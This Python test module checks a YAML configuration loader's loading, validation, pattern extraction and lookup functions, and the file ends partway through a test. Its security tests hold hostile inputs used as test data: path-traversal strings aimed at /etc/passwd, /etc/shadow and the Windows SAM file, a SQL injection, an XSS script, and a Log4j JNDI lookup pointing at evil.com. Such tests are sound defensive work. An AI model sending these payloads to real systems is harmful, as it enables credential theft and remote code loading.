"""
Behavior-focused tests for YAML configuration handling functionality.

This module provides comprehensive testing of the YAML configuration system through
black-box behavioral validation, focusing on observable outputs and public API contracts
rather than internal implementation details.

Key Features:
- Black-box behavioral validation through public configuration interfaces
- Protocol-based mock implementations for consistent dependency isolation
- AAA pattern structure for improved readability and maintainability
- Enhanced edge-case coverage through parameterized test scenarios
- Centralized fixture usage from tests/conftest.py for consistent test patterns
- Observable behavior validation (return values, side effects, error conditions)
- No access to private functions or internal implementation details

Test Categories:
- Configuration loading and validation behavior
- Pattern extraction and filtering functionality
- Dataset and experiment information retrieval
- Edge-case handling and error condition validation
- Unicode and cross-platform compatibility
- Input sanitization and security validation
"""

import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional, Union
import pytest
import yaml

# Import the public API functions we want to test
from flyrigloader.config.yaml_config import (
    load_config,
    validate_config_dict,
    get_ignore_patterns,
    get_mandatory_substrings,
    get_dataset_info,
    get_experiment_info,
    get_all_dataset_names,
    get_all_experiment_names,
    get_extraction_patterns
)

# Import centralized test utilities and fixtures
from tests.utils import (
    create_mock_config_provider,
    create_mock_filesystem,
    generate_edge_case_scenarios,
    create_hypothesis_strategies
)

# Import hypothesis for property-based testing
from hypothesis import given, strategies as st, assume, settings, example


# ============================================================================
# BEHAVIOR-FOCUSED CONFIGURATION VALIDATION TESTS
# ============================================================================

class TestConfigurationValidation:
    """Test configuration validation through observable behavior and public API contracts."""
    
    def test_validate_config_dict_accepts_valid_configuration(self, sample_config_dict):
        """
        Test that valid configuration dictionaries pass validation.
        
        ARRANGE - Set up valid configuration data
        ACT - Validate the configuration through public API
        ASSERT - Verify successful validation through return value
        """
        # ARRANGE - Valid configuration from centralized fixture
        valid_config = sample_config_dict
        
        # ACT - Execute validation through public API
        result = validate_config_dict(valid_config)
        
        # ASSERT - Verify behavior through observable output
        assert result == valid_config
        assert isinstance(result, dict)
        assert "project" in result

    def test_validate_config_dict_rejects_invalid_types(self):
        """
        Test that invalid input types are rejected with appropriate errors.
        
        ARRANGE - Set up invalid input data
        ACT - Attempt validation through public API
        ASSERT - Verify rejection through expected error behavior
        """
        # ARRANGE - Various invalid input types
        invalid_inputs = [
            "not a dictionary",
            123,
            [],
            None,
            set(),
            object()
        ]
        
        for invalid_input in invalid_inputs:
            # ACT - Attempt validation
            # ASSERT - Verify rejection behavior
            with pytest.raises(ValueError, match="Configuration must be a dictionary"):
                validate_config_dict(invalid_input)

    def test_validate_config_dict_minimal_valid_structure(self):
        """
        Test validation behavior with minimal valid configuration.
        
        ARRANGE - Set up minimal valid configuration
        ACT - Validate through public API
        ASSERT - Verify acceptance through successful return
        """
        # ARRANGE - Minimal valid configuration
        minimal_config = {
            "project": {
                "directories": {
                    "major_data_directory": "/path/to/data"
                }
            }
        }
        
        # ACT - Execute validation
        result = validate_config_dict(minimal_config)
        
        # ASSERT - Verify successful validation behavior
        assert result == minimal_config
        assert result["project"]["directories"]["major_data_directory"] == "/path/to/data"

    @pytest.mark.parametrize("invalid_dates_vials,expected_error_pattern", [
        ([1, 2, 3], "dates_vials must be a dictionary"),
        ({123: [1]}, "key '123' must be a string"),
        ({"2024-01-01": "not_a_list"}, "value for '2024-01-01' must be a list")
    ])
    def test_validate_config_dict_dates_vials_validation(self, sample_config_dict, 
                                                        invalid_dates_vials, 
                                                        expected_error_pattern):
        """
        Test dates_vials validation behavior through error conditions.
        
        ARRANGE - Set up configuration with invalid dates_vials
        ACT - Attempt validation through public API
        ASSERT - Verify rejection through expected error message
        """
        # ARRANGE - Configuration with invalid dates_vials structure
        config_with_invalid_dates_vials = sample_config_dict.copy()
        config_with_invalid_dates_vials["datasets"] = {
            "test_dataset": {"dates_vials": invalid_dates_vials}
        }
        
        # ACT & ASSERT - Verify rejection behavior through error
        with pytest.raises(ValueError, match=expected_error_pattern):
            validate_config_dict(config_with_invalid_dates_vials)


# ============================================================================
# CONFIGURATION LOADING BEHAVIOR TESTS
# ============================================================================

class TestConfigurationLoading:
    """Test configuration loading behavior through public API validation."""
    
    @pytest.mark.parametrize("input_type", ["file_path", "path_object", "dictionary"])
    def test_load_config_handles_different_input_types(self, sample_config_file, 
                                                      sample_config_dict, input_type):
        """
        Test configuration loading behavior with different input types.
        
        ARRANGE - Set up different input type scenarios
        ACT - Load configuration through public API
        ASSERT - Verify successful loading through consistent structure
        """
        # ARRANGE - Different input types
        if input_type == "file_path":
            config_input = sample_config_file
        elif input_type == "path_object":
            config_input = Path(sample_config_file)
        else:  # dictionary
            config_input = sample_config_dict
        
        # ACT - Load configuration through public API
        result = load_config(config_input)
        
        # ASSERT - Verify loading behavior through observable structure
        assert isinstance(result, dict)
        assert "project" in result
        # Verify that both file and dict inputs produce valid configuration structures
        if input_type != "dictionary":
            assert "datasets" in result or "experiments" in result

    def test_load_config_produces_valid_structure(self, sample_config_file):
        """
        Test that loaded configuration has expected structure through public API.
        
        ARRANGE - Set up configuration file input
        ACT - Load configuration through public API
        ASSERT - Verify structure through observable properties
        """
        # ARRANGE - Configuration file input
        config_file = sample_config_file
        
        # ACT - Load configuration
        result = load_config(config_file)
        
        # ASSERT - Verify structure through observable behavior
        assert isinstance(result, dict)
        assert "project" in result
        assert isinstance(result["project"], dict)
        assert "directories" in result["project"]
        assert isinstance(result["project"]["directories"], dict)
        assert "major_data_directory" in result["project"]["directories"]

    @pytest.mark.parametrize("invalid_path", [
        "/nonexistent/path/config.yaml",
        "",
        "/absolutely/nonexistent/file.yaml"
    ])
    def test_load_config_handles_invalid_file_paths(self, invalid_path):
        """
        Test configuration loading error behavior with invalid paths.
        
        ARRANGE - Set up invalid file path scenarios
        ACT - Attempt to load configuration
        ASSERT - Verify error behavior through expected exceptions
        """
        # ARRANGE - Invalid file path
        invalid_file_path = invalid_path
        
        # ACT & ASSERT - Verify error behavior
        with pytest.raises((FileNotFoundError, ValueError)):
            load_config(invalid_file_path)

    def test_load_config_handles_malformed_yaml(self, temp_experiment_directory):
        """
        Test configuration loading behavior with malformed YAML content.
        
        ARRANGE - Set up malformed YAML file
        ACT - Attempt to load configuration
        ASSERT - Verify error behavior through YAML error
        """
        # ARRANGE - Create malformed YAML file
        temp_dir = temp_experiment_directory["directory"]
        malformed_yaml_path = temp_dir / "malformed_config.yaml"
        
        with open(malformed_yaml_path, 'w') as f:
            f.write("{\ninvalid: yaml: content\nmissing: [brackets\n}")
        
        # ACT & ASSERT - Verify error behavior
        with pytest.raises(yaml.YAMLError):
            load_config(malformed_yaml_path)

    @pytest.mark.parametrize("invalid_input_type", [123, [], set(), object()])
    def test_load_config_rejects_invalid_input_types(self, invalid_input_type):
        """
        Test configuration loading rejection behavior with invalid input types.
        
        ARRANGE - Set up invalid input types
        ACT - Attempt to load configuration
        ASSERT - Verify rejection through expected error
        """
        # ARRANGE - Invalid input type
        invalid_input = invalid_input_type
        
        # ACT & ASSERT - Verify rejection behavior
        with pytest.raises(ValueError, match="Invalid input type"):
            load_config(invalid_input)

    def test_load_config_kedro_compatibility(self, sample_config_dict):
        """
        Test Kedro-style parameter dictionary compatibility behavior.
        
        ARRANGE - Set up Kedro-style configuration dictionary
        ACT - Load configuration through public API
        ASSERT - Verify compatibility through identical output
        """
        # ARRANGE - Kedro-style parameter dictionary
        kedro_config = sample_config_dict
        
        # ACT - Load configuration
        result = load_config(kedro_config)
        
        # ASSERT - Verify compatibility behavior
        assert result == kedro_config
        assert isinstance(result, dict)


# ============================================================================
# PATTERN EXTRACTION BEHAVIOR TESTS
# ============================================================================

class TestPatternExtractionBehavior:
    """Test pattern and filter extraction through observable behavior validation."""
    
    @pytest.mark.parametrize("experiment,minimum_expected_patterns", [
        (None, 2),  # Project-level patterns only
        ("test_experiment", 2),  # At least project-level patterns
        ("optogenetic_manipulation", 3)  # Project + experiment-specific patterns
    ])
    def test_get_ignore_patterns_returns_expected_patterns(self, sample_config_file, 
                                                          experiment, minimum_expected_patterns):
        """
        Test ignore pattern extraction behavior across different scenarios.
        
        ARRANGE - Set up configuration and experiment scenarios
        ACT - Extract ignore patterns through public API
        ASSERT - Verify extraction behavior through pattern validation
        """
        # ARRANGE - Load configuration and set experiment context
        config = load_config(sample_config_file)
        experiment_name = experiment
        
        # ACT - Extract patterns through public API
        patterns = get_ignore_patterns(config, experiment=experiment_name)
        
        # ASSERT - Verify extraction behavior through observable results
        assert isinstance(patterns, list)
        assert len(patterns) >= minimum_expected_patterns
        # Verify all patterns are strings and properly formatted
        for pattern in patterns:
            assert isinstance(pattern, str)
            assert len(pattern) > 0
        
        # Verify expected project-level patterns are present
        project_pattern_indicators = ["static_horiz_ribbon", "._"]
        for indicator in project_pattern_indicators:
            assert any(indicator in pattern for pattern in patterns)

    def test_get_ignore_patterns_inheritance_behavior(self, sample_config_file):
        """
        Test pattern inheritance behavior between project and experiment levels.
        
        ARRANGE - Set up project and experiment pattern scenarios
        ACT - Extract patterns at different levels
        ASSERT - Verify inheritance through pattern comparison
        """
        # ARRANGE - Load configuration for pattern comparison
        config = load_config(sample_config_file)
        
        # ACT - Extract patterns at different levels
        project_patterns = get_ignore_patterns(config)
        experiment_patterns = get_ignore_patterns(config, experiment="multi_experiment")
        
        # ASSERT - Verify inheritance behavior
        assert isinstance(project_patterns, list)
        assert isinstance(experiment_patterns, list)
        assert len(experiment_patterns) >= len(project_patterns)
        
        # Verify all project patterns are inherited in experiment patterns
        for project_pattern in project_patterns:
            assert project_pattern in experiment_patterns

    @pytest.mark.parametrize("experiment,expected_substring_count", [
        (None, 0),  # No project-level mandatory substrings
        ("test_experiment", 0),  # No experiment-specific substrings
        ("nonexistent_experiment", 0)  # Non-existent experiment returns empty
    ])
    def test_get_mandatory_substrings_behavior(self, sample_config_file, 
                                              experiment, expected_substring_count):
        """
        Test mandatory substring extraction behavior.
        
        ARRANGE - Set up experiment scenarios for substring extraction
        ACT - Extract mandatory substrings through public API
        ASSERT - Verify extraction behavior through count validation
        """
        # ARRANGE - Load configuration and set experiment context
        config = load_config(sample_config_file)
        experiment_name = experiment
        
        # ACT - Extract mandatory substrings
        substrings = get_mandatory_substrings(config, experiment=experiment_name)
        
        # ASSERT - Verify extraction behavior
        assert isinstance(substrings, list)
        assert len(substrings) == expected_substring_count
        
        # Verify all returned items are strings
        for substring in substrings:
            assert isinstance(substring, str)

    def test_pattern_conversion_behavior_through_public_api(self, sample_config_dict):
        """
        Test pattern conversion behavior through observable public API results.
        
        Note: This replaces direct testing of _convert_to_glob_pattern private function
        by observing the conversion behavior through get_ignore_patterns results.
        
        ARRANGE - Set up configuration with various pattern types
        ACT - Extract patterns through public API
        ASSERT - Verify conversion behavior through pattern format validation
        """
        # ARRANGE - Configuration with different pattern types
        config_with_patterns = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": [
                    "simple",           # Should become "*simple*"
                    "*already_glob*",   # Should remain unchanged
                    "has?wildcard",     # Should remain unchanged
                    "._"                # Should become "*._*"
                ]
            }
        }
        
        # ACT - Extract patterns to observe conversion behavior
        patterns = get_ignore_patterns(config_with_patterns)
        
        # ASSERT - Verify conversion behavior through observable results
        assert isinstance(patterns, list)
        assert len(patterns) == 4
        
        # Verify that simple patterns are wrapped with wildcards
        simple_patterns = [p for p in patterns if "simple" in p]
        assert len(simple_patterns) == 1
        assert simple_patterns[0].startswith("*") and simple_patterns[0].endswith("*")
        
        # Verify that existing glob patterns are preserved
        glob_patterns = [p for p in patterns if "already_glob" in p]
        assert len(glob_patterns) == 1
        assert "*already_glob*" in glob_patterns[0]
        
        # Verify special case handling through observable results
        dot_underscore_patterns = [p for p in patterns if "._" in p]
        assert len(dot_underscore_patterns) == 1
        assert "*._*" in dot_underscore_patterns[0]


# ============================================================================
# DATASET AND EXPERIMENT INFORMATION BEHAVIOR TESTS
# ============================================================================

class TestDatasetAndExperimentInformation:
    """Test dataset and experiment information extraction through behavioral validation."""
    
    def test_get_dataset_info_returns_valid_information(self, sample_config_file):
        """
        Test dataset information extraction behavior.
        
        ARRANGE - Set up configuration with dataset information
        ACT - Extract dataset information through public API
        ASSERT - Verify information structure through observable properties
        """
        # ARRANGE - Load configuration with dataset information
        config = load_config(sample_config_file)
        dataset_name = "baseline_behavior"
        
        # ACT - Extract dataset information
        dataset_info = get_dataset_info(config, dataset_name)
        
        # ASSERT - Verify information structure and content
        assert isinstance(dataset_info, dict)
        assert "rig" in dataset_info
        assert dataset_info["rig"] == "old_opto"
        
        # Verify patterns are present and properly structured
        if "patterns" in dataset_info:
            assert isinstance(dataset_info["patterns"], list)
            patterns = dataset_info["patterns"]
            baseline_pattern_found = any("baseline" in str(pattern).lower() for pattern in patterns)
            assert baseline_pattern_found, "Expected baseline pattern in dataset patterns"

    def test_get_dataset_info_handles_nonexistent_dataset(self, sample_config_file):
        """
        Test dataset information extraction error behavior for nonexistent datasets.
        
        ARRANGE - Set up request for nonexistent dataset
        ACT - Attempt to extract dataset information
        ASSERT - Verify error behavior through expected exception
        """
        # ARRANGE - Load configuration and set nonexistent dataset
        config = load_config(sample_config_file)
        nonexistent_dataset = "nonexistent_dataset"
        
        # ACT & ASSERT - Verify error behavior
        with pytest.raises(KeyError, match="Dataset 'nonexistent_dataset' not found"):
            get_dataset_info(config, nonexistent_dataset)

    def test_get_experiment_info_returns_valid_information(self, sample_config_file):
        """
        Test experiment information extraction behavior.
        
        ARRANGE - Set up configuration with experiment information
        ACT - Extract experiment information through public API
        ASSERT - Verify information structure through observable properties
        """
        # ARRANGE - Load configuration with experiment information
        config = load_config(sample_config_file)
        experiment_name = "optogenetic_manipulation"
        
        # ACT - Extract experiment information
        experiment_info = get_experiment_info(config, experiment_name)
        
        # ASSERT - Verify information structure and content
        assert isinstance(experiment_info, dict)
        assert "datasets" in experiment_info
        assert isinstance(experiment_info["datasets"], list)
        
        # Verify expected datasets are present
        datasets = experiment_info["datasets"]
        expected_datasets = ["optogenetic_stimulation", "baseline_behavior"]
        for expected_dataset in expected_datasets:
            assert expected_dataset in datasets

    def test_get_experiment_info_handles_nonexistent_experiment(self, sample_config_file):
        """
        Test experiment information extraction error behavior for nonexistent experiments.
        
        ARRANGE - Set up request for nonexistent experiment
        ACT - Attempt to extract experiment information
        ASSERT - Verify error behavior through expected exception
        """
        # ARRANGE - Load configuration and set nonexistent experiment
        config = load_config(sample_config_file)
        nonexistent_experiment = "nonexistent_experiment"
        
        # ACT & ASSERT - Verify error behavior
        with pytest.raises(KeyError, match="Experiment 'nonexistent_experiment' not found"):
            get_experiment_info(config, nonexistent_experiment)

    @pytest.mark.parametrize("config_section,get_names_func,expected_names", [
        ("datasets", get_all_dataset_names, ["baseline_behavior", "optogenetic_stimulation"]),
        ("experiments", get_all_experiment_names, ["optogenetic_manipulation", "multi_experiment"])
    ])
    def test_get_all_names_functions_behavior(self, sample_config_file, 
                                             config_section, get_names_func, expected_names):
        """
        Test name extraction functions behavior through observable results.
        
        ARRANGE - Set up configuration with known entities
        ACT - Extract all names through public API functions
        ASSERT - Verify extraction behavior through expected names
        """
        # ARRANGE - Load configuration with known entities
        config = load_config(sample_config_file)
        
        # ACT - Extract names through public API
        names = get_names_func(config)
        
        # ASSERT - Verify extraction behavior
        assert isinstance(names, list)
        assert len(names) >= len(expected_names)
        
        # Verify expected names are present
        for expected_name in expected_names:
            if expected_name in config.get(config_section, {}):
                assert expected_name in names

    @pytest.mark.parametrize("empty_config,get_names_func", [
        ({}, get_all_dataset_names),
        ({"project": {"directories": {"major_data_directory": "/test"}}}, get_all_dataset_names),
        ({}, get_all_experiment_names),
        ({"project": {"directories": {"major_data_directory": "/test"}}}, get_all_experiment_names)
    ])
    def test_get_all_names_handles_empty_configurations(self, empty_config, get_names_func):
        """
        Test name extraction behavior with empty configurations.
        
        ARRANGE - Set up empty or minimal configurations
        ACT - Extract names through public API
        ASSERT - Verify behavior with empty configurations
        """
        # ARRANGE - Empty or minimal configuration
        config = empty_config
        
        # ACT - Extract names
        names = get_names_func(config)
        
        # ASSERT - Verify behavior with empty configurations
        assert isinstance(names, list)
        assert len(names) == 0


# ============================================================================
# EDGE-CASE AND BOUNDARY CONDITION TESTS
# ============================================================================

class TestEdgeCaseHandling:
    """Test edge-case handling and boundary conditions through behavioral validation."""
    
    def test_unicode_path_handling_behavior(self, temp_experiment_directory):
        """
        Test Unicode path handling behavior through configuration loading.
        
        ARRANGE - Set up Unicode configuration file
        ACT - Load configuration through public API
        ASSERT - Verify Unicode handling through successful loading
        """
        # ARRANGE - Create configuration with Unicode paths
        temp_dir = temp_experiment_directory["directory"]
        unicode_config_path = temp_dir / "tëst_cönfïg.yaml"
        
        unicode_config_content = """
project:
  directories:
    major_data_directory: "/测试/数据/目录"
  ignore_substrings: 
    - "测试_pattern"
    - "données_françaises"
    - "файлы_русские"
datasets:
  实验数据集:
    rig: "équipement_français"
    dates_vials:
      "2024-01-01": [1, 2, 3]
"""
        
        with open(unicode_config_path, 'w', encoding='utf-8') as f:
            f.write(unicode_config_content)
        
        # ACT - Load Unicode configuration
        result = load_config(unicode_config_path)
        
        # ASSERT - Verify Unicode handling behavior
        assert isinstance(result, dict)
        assert "project" in result
        assert "datasets" in result
        
        # Verify Unicode content is preserved
        datasets = result["datasets"]
        assert "实验数据集" in datasets
        assert datasets["实验数据集"]["rig"] == "équipement_français"

    def test_malformed_yaml_handling_behavior(self, temp_experiment_directory):
        """
        Test malformed YAML handling behavior through error validation.
        
        ARRANGE - Set up various malformed YAML scenarios
        ACT - Attempt to load malformed configurations
        ASSERT - Verify error handling behavior
        """
        # ARRANGE - Create malformed YAML scenarios
        temp_dir = temp_experiment_directory["directory"]
        
        malformed_scenarios = [
            ("invalid_syntax.yaml", "{\ninvalid: yaml: content\nmissing: [brackets"),
            ("missing_quotes.yaml", "project:\n  name: unquoted string with: colon"),
            ("invalid_structure.yaml", "- this\n- is\n- a\n- list\n- not\n- dict")
        ]
        
        for filename, content in malformed_scenarios:
            # ARRANGE - Create malformed file
            malformed_path = temp_dir / filename
            with open(malformed_path, 'w') as f:
                f.write(content)
            
            # ACT & ASSERT - Verify error handling behavior
            with pytest.raises(yaml.YAMLError):
                load_config(malformed_path)

    def test_deeply_nested_configuration_behavior(self):
        """
        Test handling of deeply nested configuration structures.
        
        ARRANGE - Set up deeply nested configuration
        ACT - Validate configuration through public API
        ASSERT - Verify handling through successful validation
        """
        # ARRANGE - Create deeply nested configuration
        deeply_nested_config = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "nested": {
                    "level2": {
                        "level3": {
                            "level4": {
                                "level5": {
                                    "deep_setting": "test_value"
                                }
                            }
                        }
                    }
                }
            }
        }
        
        # ACT - Validate deeply nested structure
        result = validate_config_dict(deeply_nested_config)
        
        # ASSERT - Verify handling behavior
        assert isinstance(result, dict)
        assert result == deeply_nested_config
        
        # Verify deep access works through the result
        deep_value = result["project"]["nested"]["level2"]["level3"]["level4"]["level5"]["deep_setting"]
        assert deep_value == "test_value"

    @pytest.mark.parametrize("special_characters", [
        "pattern_with_!@#$%^&*()",
        "path/with\\backslashes", 
        "quotes_\"and'_apostrophes",
        "newlines\nand\ttabs",
        "regex_pattern.*[abc]+"
    ])
    def test_special_character_handling_behavior(self, special_characters):
        """
        Test special character handling in configuration values.
        
        ARRANGE - Set up configuration with special characters
        ACT - Process configuration through public API
        ASSERT - Verify special character handling through safe processing
        """
        # ARRANGE - Configuration with special characters
        config_with_special_chars = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": [special_characters]
            }
        }
        
        # ACT - Process configuration and extract patterns
        validated_config = validate_config_dict(config_with_special_chars)
        patterns = get_ignore_patterns(validated_config)
        
        # ASSERT - Verify special character handling behavior
        assert isinstance(validated_config, dict)
        assert isinstance(patterns, list)
        assert len(patterns) == 1
        
        # Verify special characters are preserved in some form
        pattern = patterns[0]
        assert isinstance(pattern, str)
        assert len(pattern) > 0

    @pytest.mark.parametrize("empty_value", [None, "", []])
    def test_empty_value_handling_behavior(self, empty_value):
        """
        Test handling of various empty values in configuration.
        
        ARRANGE - Set up configuration with empty values
        ACT - Process configuration through public API
        ASSERT - Verify empty value handling behavior
        """
        # ARRANGE - Configuration with empty values
        config_with_empty = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": empty_value
            }
        }
        
        # ACT - Process configuration
        if empty_value is None or isinstance(empty_value, list):
            # These should be handled gracefully
            validated_config = validate_config_dict(config_with_empty)
            patterns = get_ignore_patterns(validated_config)
            
            # ASSERT - Verify graceful handling
            assert isinstance(validated_config, dict)
            assert isinstance(patterns, list)
        else:
            # Other empty values might cause issues
            # We test that the system behaves predictably
            try:
                validated_config = validate_config_dict(config_with_empty)
                patterns = get_ignore_patterns(validated_config)
                assert isinstance(patterns, list)
            except (ValueError, TypeError, AttributeError):
                # Expected for some invalid types - verify error is reasonable
                pass


# ============================================================================
# PROPERTY-BASED BEHAVIORAL TESTING
# ============================================================================

class TestPropertyBasedBehavior:
    """Property-based testing focused on input-output behavioral contracts."""
    
    @given(st.text(min_size=1, max_size=50))
    @settings(max_examples=20)
    def test_pattern_conversion_preserves_wildcards(self, pattern_string):
        """
        Test that patterns with existing wildcards are preserved through the API.
        
        Property: If a pattern contains wildcards, the output should contain those wildcards.
        """
        # ARRANGE - Configuration with test pattern
        assume(pattern_string.strip())  # Non-empty after stripping
        assume('*' in pattern_string or '?' in pattern_string)  # Has wildcards
        
        config = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": [pattern_string]
            }
        }
        
        # ACT - Process through public API
        patterns = get_ignore_patterns(config)
        
        # ASSERT - Verify wildcard preservation property
        assert len(patterns) == 1
        result_pattern = patterns[0]
        
        # Property: Wildcards should be preserved
        if '*' in pattern_string:
            assert '*' in result_pattern
        if '?' in pattern_string:
            assert '?' in result_pattern

    @given(st.text(min_size=1, max_size=30).filter(lambda x: '*' not in x and '?' not in x))
    @settings(max_examples=20)
    def test_simple_patterns_get_wildcards_added(self, simple_pattern):
        """
        Test that simple patterns without wildcards get wildcards added.
        
        Property: Simple patterns should be enhanced for substring matching.
        """
        # ARRANGE - Configuration with simple pattern
        assume(simple_pattern.strip())  # Non-empty after stripping
        
        config = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": [simple_pattern]
            }
        }
        
        # ACT - Process through public API
        patterns = get_ignore_patterns(config)
        
        # ASSERT - Verify wildcard addition property
        assert len(patterns) == 1
        result_pattern = patterns[0]
        
        # Property: Simple patterns should get wildcards for substring matching
        assert len(result_pattern) >= len(simple_pattern)
        # Most simple patterns should start and end with * for substring matching
        if not simple_pattern.startswith('.'):
            assert result_pattern.startswith('*') and result_pattern.endswith('*')

    @given(st.dictionaries(
        keys=st.text(min_size=1, max_size=20),
        values=st.lists(st.integers(min_value=1, max_value=100), min_size=1, max_size=10),
        min_size=1,
        max_size=5
    ))
    @settings(max_examples=15)
    def test_dates_vials_validation_properties(self, dates_vials_dict):
        """
        Test dates_vials validation properties through behavioral contracts.
        
        Property: Valid dates_vials structures should pass validation.
        """
        # ARRANGE - Configuration with generated dates_vials
        config = {
            "project": {"directories": {"major_data_directory": "/test"}},
            "datasets": {
                "test_dataset": {"dates_vials": dates_vials_dict}
            }
        }
        
        # ACT - Validate through public API
        result = validate_config_dict(config)
        
        # ASSERT - Verify validation properties
        assert isinstance(result, dict)
        assert "datasets" in result
        assert "test_dataset" in result["datasets"]
        assert result["datasets"]["test_dataset"]["dates_vials"] == dates_vials_dict

    @given(st.integers(min_value=0, max_value=20))
    @settings(max_examples=10)
    def test_configuration_with_many_ignore_patterns(self, pattern_count):
        """
        Test configuration behavior with varying numbers of ignore patterns.
        
        Property: Pattern extraction should handle any number of patterns consistently.
        """
        # ARRANGE - Configuration with variable pattern count
        patterns = [f"pattern_{i}" for i in range(pattern_count)]
        config = {
            "project": {
                "directories": {"major_data_directory": "/test"},
                "ignore_substrings": patterns
            }
        }
        
        # ACT - Extract patterns through public API
        result_patterns = get_ignore_patterns(config)
        
        # ASSERT - Verify pattern handling properties
        assert isinstance(result_patterns, list)
        assert len(result_patterns) == pattern_count
        
        # Property: All patterns should be processed
        for i, pattern in enumerate(result_patterns):
            assert isinstance(pattern, str)
            assert f"pattern_{i}" in pattern


# ============================================================================
# SECURITY AND INPUT SANITIZATION TESTS
# ============================================================================

class TestSecurityBehavior:
    """Test security-related behavior through input sanitization validation."""
    
    @pytest.mark.parametrize("malicious_path", [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "file:///etc/passwd"
    ])
    def test_path_traversal_prevention_behavior(self, malicious_path):
        """
        Test path traversal prevention through load_config behavior.
        
        ARRANGE - Set up malicious path scenarios
        ACT - Attempt to load configuration from malicious path
        ASSERT - Verify prevention through expected errors
        """
        # ARRANGE - Malicious path input
        dangerous_path = malicious_path
        
        # ACT & ASSERT - Verify prevention behavior
        with pytest.raises((FileNotFoundError, ValueError, OSError, PermissionError)):
            load_config(dangerous_path)

    def test_input_sanitization_behavior(self):
        """
        Test input sanitization for potentially dangerous configuration values.
        
        ARRANGE - Set up configuration with potentially dangerous content
        ACT - Process configuration through public API
        ASSERT - Verify safe handling through successful processing
        """
        # ARRANGE - Configuration with potentially dangerous content
        potentially_dangerous_config = {
            "project": {
                "directories": {"major_data_directory": "/safe/path"},
                "ignore_substrings": [
                    "'; DROP TABLE users; --",  # SQL injection attempt
                    "<script>alert('xss')</script>",  # XSS attempt
                    "${jndi:ldap://evil.com/a}",  # Log4j injection attempt
                ]
            }
        }
        
        # ACT - Process potentially dangerous configuration
        validated_config = validate_config_dict(potentially_dangerous_config)
        patterns = get_ignore_patterns(validated_config)
        
        # ASSERT - Verify safe handling behavior
        assert isinstance(validated_config, dict)
        assert isinstance(patterns, list)
        assert len(patterns) == 3
        
        # Verify dangerous content is treated as literal strings
        pattern_content = ' '.join(patterns)
        assert "DROP TABLE" in pattern_content
        assert "script" in pattern_content
        assert "jndi" in pattern_content


# ============================================================================
# INTEGRATION AND WORKFLOW TESTS
# ============================================================================

class TestConfigurationWorkflow:
    """Test complete configuration workflows through end-to-end behavioral validation."""
    
    def test_complete_configuration_workflow(self, sample_config_file):
        """
        Test complete configuration workflow from loading to information extraction.
        
        ARRANGE - Set up complete configuration workflow scenario
        ACT - Execute full workflow through public APIs
        ASSERT - Verify workflow behavior through consistent results
        """
        # ARRANGE - Configuration file for complete workflow
        config_file = sample_config_file
        
        # ACT - Execute complete workflow
        # Step 1: Load configuration
        config = load_config(config_file)
        
        # Step 2: Validate structure
        validated_config = validate_config_dict(config)
        
        # Step 3: Extract various information types
        project_patterns = get_ignore_patterns(validated_config)
        all_datasets = get_all_dataset_names(validated_config)
        all_experiments = get_all_experiment_names(validated_config)
        
        # Step 4: Test information extraction for entities
        dataset_infos = []
        for dataset_name in all_datasets:
            try:
                dataset_info = get_dataset_info(validated_config, dataset_name)
                dataset_infos.append(dataset_info)
            except KeyError:
                # Some datasets might not exist in test config
                pass
        
        experiment_infos = []
        for exp_name in all_experiments:
            try:
                exp_info = get_experiment_info(validated_config, exp_name)
                experiment_infos.append(exp_info)
            except KeyError:
                # Some experiments might not exist in test config
                pass
        
        # ASSERT - Verify complete workflow behavior
        assert isinstance(validated_config, dict)
        assert isinstance(project_patterns, list)
        assert isinstance(all_datasets, list)
        assert isinstance(all_experiments, list)
        
        # Verify information extraction worked
        for dataset_info in dataset_infos:
            assert isinstance(dataset_info, dict)
        
        for exp_info in experiment_infos:
            assert isinstance(exp_info, dict)
        
        # Verify workflow consistency
        assert validated_config == config  # Validation should preserve content

    def test_hierarchical_pattern_extraction_behavior(self, sample_config_file):
        """
        Test hierarchical pattern extraction behavior across project and experiment levels.
        
        ARRANGE - Set up hierarchical pattern scenario
        ACT - Extract patterns at different hierarchy levels
        ASSERT - Verify hierarchical behavior through pattern inheritance
        """
        # ARRANGE - Load configuration for hierarchical testing
        config = load_config(sample_config_file)
        
        # ACT - Extract patterns at different levels
        project_only_patterns = get_ignore_patterns(config)
        
        # Get experiment names and test pattern inheritance
        experiment_names = get_all_experiment_names(config)
        experiment_pattern_results = {}
        
        for exp_name in experiment_names:
            try:
                exp_patterns = get_ignore_patterns(config, experiment=exp_name)
                experiment_pattern_results[exp_name] = exp_patterns
            except (KeyError, AttributeError):
                # Some experiments might not be properly configured
                continue
        
        # ASSERT - Verify hierarchical behavior
        assert isinstance(project_only_patterns, list)
        
        for exp_name, exp_patterns in experiment_pattern_results.items():
            assert isinstance(exp_patterns, list)
            # Verify inheritance: experiment patterns should include project patterns
            assert len(exp_patterns) >= len(project_only_patterns)
            
            # Verify project patterns are inherited
            for project_pattern in project_only_patterns:
                assert project_pattern in exp_patterns

    def test_extraction_patterns_behavior(self, sample_config_file):
        """
        Test extraction pattern behavior through public API validation.
        
        ARRANGE - Set up configuration with extraction patterns
        ACT - Extract patterns through public API
        ASSERT - Verify extraction behavior
        """
        # ARRANGE - Load configuration with extraction patterns
        config = load_config(sample_config_file)
        
        # ACT - Extract extraction patterns for different contexts
        project_extraction_patterns = get_extraction_patterns(config)
        
        # Test with experiment context
        experiment_names = get_all_experiment_names(config)
        experiment_extraction_results = {}
        
        for exp_name in experiment_names:
            try:
                exp_extraction_patterns = get_extraction_patterns(config, experiment=exp_name)
                experiment_extraction_results[exp_name] = exp_extraction_patterns
            except (KeyError, AttributeError):
                continue
        
        # Test with dataset context
        dataset_names = get_all_dataset_names(config)
        dataset_extraction_results = {}
        
        for dataset_name in dataset_names:
            try:
                dataset_extraction_patterns = get_extraction_patterns(config, dataset_name=dataset_name)
                dataset_extraction_results[dataset_name] = dataset_extraction_patterns
            except (KeyError, AttributeError):
                continue
        
        # ASSERT - Verify extraction pattern behavior
        # Project-level patterns should be None or list
